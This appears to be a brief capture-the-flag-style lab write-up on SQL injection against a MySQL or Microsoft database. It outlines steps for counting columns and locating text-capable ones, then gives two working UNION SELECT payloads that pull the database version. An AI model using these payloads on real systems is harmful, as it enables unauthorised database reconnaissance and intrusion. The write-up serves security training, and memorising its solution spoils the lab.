## Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft

## Step 1

Checking number of column

<img src="../Images/ps1.png" width="550" height="200">

## Step 2

Check which column we can insert in

<img src="../Images/ps2.png" width="550" height="200">

Here we are able to insert in both column

<img src="../Images/ps3.png" width="550" height="200">

## Step 3

Now we use this payload

' UNION SELECT @@version,NULL#

Or

' UNION SELECT NULL,@@version#

Encode it to URL

<img src="../Images/ps4.png" width="550" height="200">

Here we get the answer

<img src="../Images/ps5.png" width="550" height="200">

---
